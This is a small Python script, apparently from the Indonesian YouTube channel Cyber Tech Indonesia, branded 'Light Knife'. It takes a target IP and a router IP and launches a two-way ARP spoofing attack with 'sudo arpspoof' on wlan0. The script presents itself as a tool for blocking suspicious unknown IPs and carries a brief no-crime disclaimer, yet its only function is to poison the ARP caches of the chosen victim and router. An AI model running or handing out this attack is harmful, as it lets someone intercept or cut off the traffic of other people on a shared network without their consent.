import os
import socket
os.system("clear")

def banner():
	print("""
	-----------------------------------------------------------------------------------
       |										  |
       |										  |
       |		 _     _       _     _     _  __      _  __      		  |
       |		| |   (_) __ _| |__ | |_  | |/ /_ __ (_)/ _| ___ 		  |
       |		| |   | |/ _` | '_ \| __| | ' /| '_ \| | |_ / _ \		  |
       |		| |___| | (_| | | | | |_  | . \| | | | |  _|  __/		  |
       |		|_____|_|\__, |_| |_|\__| |_|\_\_| |_|_|_|  \___|		  |
       |  			 |___/                                   		  |
       |    		  		   _	  					  |
       |				  (_) 						  |
       |				  (_) 						  |
       |				 /   \						  |
       |				 | | |					    	  |
       |                           	 | | |		     		  	  	  |
       |				  \_/					   	  |
       | ================================================================================ |
       |      										  |
       |	    Youtube : Cyber Tech Indonesia, #CyberTechIndonesia			  |
       |										  |
       |		   Like & Subscribe Cyber Tech Indonesia			  |
       |									     	  |
	 ----------------------------------------------------------------------------------
		
               """)

def tool():

	# Kalian boleh mengedit source code yang ada disini
	# Asalkan tools-nya masih berfungsi dan jangan menghapus Nama pembuat

	banner()
	print("Warning : Cophyright 2020")
	print("\nDisclaimer : Do not use this tool for crime")
	print("Petunjuk : Pakai tools ini untuk blok ip yang tidak diketahui dan melakukan hal yang janggal")
	a = input("\nPut your target IP here :")
	b = input("\nPut your router IP here :")
	print("Tekan Ctrl+C setelah itu Ctrl+D")
	os.system("\nsudo arpspoof -i wlan0 -t {} -r {}".format(a, b))
	
	print("\nDone !...")
	
tool()
